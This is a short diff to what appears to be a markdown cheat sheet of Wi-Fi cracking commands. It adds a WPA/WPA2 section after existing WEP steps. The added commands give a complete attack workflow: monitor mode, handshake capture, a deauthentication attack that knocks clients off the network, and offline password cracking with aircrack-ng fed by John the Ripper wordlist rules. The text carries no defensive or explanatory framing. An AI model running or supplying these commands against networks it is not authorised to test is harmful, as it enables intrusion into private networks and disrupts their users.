@@ -53,3 +53,11 @@ aireplay-ng -3 -b <AP MAC> -h <Source MAC> <interface name>
 aireplay-ng -0 1 -a <AP MAC> -c <MACCLIENT> <interface name>
 aircrack-ng -z <capture filename> 
 ```
+### WPA-WPA2
+```
+airmon-ng start <interface> <AP channel>
+airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>
+```
+
